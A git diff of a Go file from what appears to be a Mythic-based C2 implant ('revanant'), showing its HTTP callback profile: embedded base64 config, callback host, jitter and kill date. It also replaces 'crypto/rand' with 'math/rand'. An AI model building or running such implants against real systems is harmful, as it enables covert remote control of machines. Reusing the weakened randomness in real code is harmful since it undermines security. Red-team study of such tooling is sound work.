@@ -1,29 +1,39 @@
+//go:build (linux || darwin) && http
+
 package profiles
 
 import (
 	"bytes"
-	"crypto/rand"
 	"crypto/rsa"
 	"encoding/base64"
+	"io"
+	"os"
+
+	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/responses"
+	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/utils"
+
 	"encoding/json"
 	"fmt"
-	"io"
+	"math/rand"
 	"net/http"
 	"net/url"
-	"os"
 	"strconv"
 	"strings"
 	"time"
 
-	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/profiles/utils"
+	// Poseidon
+	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/utils/crypto"
+	"github.com/xcr-19/revanant/Payload_Type/revanant/agent/pkg/utils/structs"
 )
 
+// HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
+// base64 encoded version of the JSON initial configuration of HTTP
 var http_initial_config string
 
 type HTTPInitialConfig struct {
 	CallbackHost           string            `json:"callback_host"`
 	CallbackPort           uint              `json:"callback_port"`
-	KillDate               string            `json:"killdate"`
+	Killdate               string            `json:"killdate"`
 	Interval               uint              `json:"callback_interval"`
 	Jitter                 uint              `json:"callback_jitter"`
 	PostURI                string            `json:"post_uri"`
@@ -58,15 +68,14 @@ type C2HTTP struct {
 	interruptSleepChannel chan bool
 }
 
+// New creates a new HTTP C2 profile from the package's global variables and returns it
 func init() {
 	initialConfigBytes, err := base64.StdEncoding.DecodeString(http_initial_config)
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("error trying to decode initial http config, exiting: %v\n", err))
 		os.Exit(1)
 	}
-
 	initialConfig := HTTPInitialConfig{}
-
 	err = json.Unmarshal(initialConfigBytes, &initialConfig)
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial http config, exiting: %v\n", err))
@@ -99,7 +108,7 @@ func init() {
 		final_url = final_url + "/"
 	}
 	//fmt.Printf("final url: %s\n", final_url)
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.KillDate)
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
 		os.Exit(1)
